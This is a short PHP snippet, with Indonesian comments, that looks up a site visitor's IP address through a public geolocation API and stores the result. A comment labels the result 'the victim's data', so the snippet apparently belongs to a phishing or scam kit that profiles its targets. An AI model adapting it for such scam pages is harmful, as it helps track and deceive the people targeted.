<?php
// SCRIPT BY ARPANTEK
// COPYRIGHT © ITS ME ARPANTEK
// HARGAI W OK, JANGAN LO UBAH COPYRIGHT NYA

// MENGIRIM IP ADDRESS KE WEB API
$ipnya = $_SERVER['REMOTE_ADDR'];
$url = 'https://freegeoip.app/json/'.$ipnya;

// MEMPROSES DATA
$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$data = curl_exec($ch);
curl_close($ch);

// MENDAPATKAN DATA KORBAN
$arpantek = json_decode($data, TRUE);
?>